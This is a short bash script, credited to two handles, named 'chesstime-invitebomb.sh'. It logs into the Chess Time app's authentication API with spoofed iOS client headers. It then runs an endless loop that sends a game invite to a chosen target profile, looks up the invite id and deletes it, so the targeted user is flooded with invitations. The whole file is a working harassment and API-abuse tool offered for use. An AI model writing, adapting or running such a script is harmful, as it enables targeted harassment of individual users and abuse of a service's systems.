#!/bin/bash
# by taup1n and slobber
# usage: ./chesstime-invitebomb.sh <login id> <password> <target profile id>

set -e

if [ $# -lt 3 ]
then
echo "$0 <login id> <password> <target profile id>"
exit 1
fi

token=$(curl -H 'Host: auth.chesstimelive.com' -H 'Accept: */*' -H 'User-Agent: haptic_chess/7.8.8.2 CFNetwork/894 Darwin/17.4.0' -H 'Accept-Language: en-us' --data "{
  \"user\" : \"$1\"
}" --compressed 'https://auth.chesstimelive.com/jlogin/init2' | jq -r .rmessage)

curl -H 'Host: auth.chesstimelive.com' -H 'Accept: */*' -H 'User-Agent: haptic_chess/7.8.8.2 CFNetwork/894 Darwin/17.4.0' -H 'Accept-Language: en-us' --data "{
  \"code\" : \"$token\",
  \"password\" : \"$2\",
  \"device\" : \"ios\",
  \"isPro\" : \"N\",
  \"sysversion\" : \"11.2.5\",
  \"version\" : \"7.8.8\"
}" --compressed 'https://auth.chesstimelive.com/jlogin/enter'

while [ 1 > 0 ]
do
curl -H 'Host: server.chesstimelive.com' -H 'Accept: */*' -H 'User-Agent: haptic_chess/7.8.8.2 CFNetwork/894 Darwin/17.4.0' -H 'Accept-Language: en-us' --data "{
  \"username\" : \"$3\",
  \"secPerMove\" : 172800
}" --compressed "http://server.chesstimelive.com/juser/invite/user?tkn=$token"
gid=$(curl -H 'Host: server.chesstimelive.com' -H 'Accept: */*' -H 'User-Agent: haptic_chess/7.8.8.2 CFNetwork/894 Darwin/17.4.0' -H 'Accept-Language: en-us' --compressed "http://server.chesstimelive.com/jgame/active?tkn=$token" | jq .result.myInvites[].id)
echo $gid
curl -H 'Host: server.chesstimelive.com' -H 'Accept: */*' -H 'User-Agent: haptic_chess/7.8.8.2 CFNetwork/894 Darwin/17.4.0' -H 'Accept-Language: en-us' --data "{

}" --compressed "http://server.chesstimelive.com/juser/invite/delete/$gid?tkn=$token"
done

